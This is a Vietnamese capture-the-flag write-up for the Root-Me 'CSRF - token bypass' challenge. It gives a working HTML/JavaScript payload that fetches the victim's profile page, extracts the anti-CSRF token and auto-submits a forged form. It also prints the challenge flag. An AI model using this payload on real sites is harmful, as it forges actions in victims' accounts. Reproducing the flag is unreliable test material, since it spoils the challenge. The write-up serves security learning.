# Write up challenge CSRF - token bypass

Tác giả:
- **Nguyễn Mỹ Quỳnh** <br>

  
[Link Challenge](https://www.root-me.org/en/Challenges/Web-Client/CSRF-token-bypass)<br>
</br>

Truy cập challenge ta thấy bài này có cấu trúc tương tự CSRF - 0 protection. Nhưng khi inspect ta thấy được chỗ khác là có thêm token được tạo bởi server đặt ẩn vào mã html và làm mới theo thời gian thực để kiểm tra tránh tấn công CSRF.

<img src="./img/1.png" alt="normal_acc_TRAbID"/> 

<img src="./img/2.png" alt="normal_acc_TRAbID"/>

<br>

Từ đó ý tưởng là ta sẽ xây dựng đoạn code tương tự CSRF - 0 protection, nhưng thêm đoạn script để truy cậ vào trang Profile và lấy token 

    <form name="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data"> 
	    <input type="hidden" name="username" value="q" /> 
	    <input type="hidden" name="status" value="on" />
	    <input id="admin-token" type="hidden" name="token" value="" />
    </form> 
    <script> 
	    var request = new XMLHttpRequest(); 
	    request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false); 
	    request.send(null); 
	    var respone = request.responseText; 
	    var groups = respone.match("token\" value=\"(.*?)\""); 
	    var token = groups[1]; document.getElementById("admin-token").value = token; 
	    document.csrf.submit(); 
    </script>

Có được flag:

<img src="./img/4.png" alt="normal_acc_TRAbID"/>


Submit thành công 

<img src="./img/5.png" alt="normal_acc_TRAbID"/>

<br><br>

> **Flag:** Byp4ss_CSRF_T0k3n-w1th-XSS

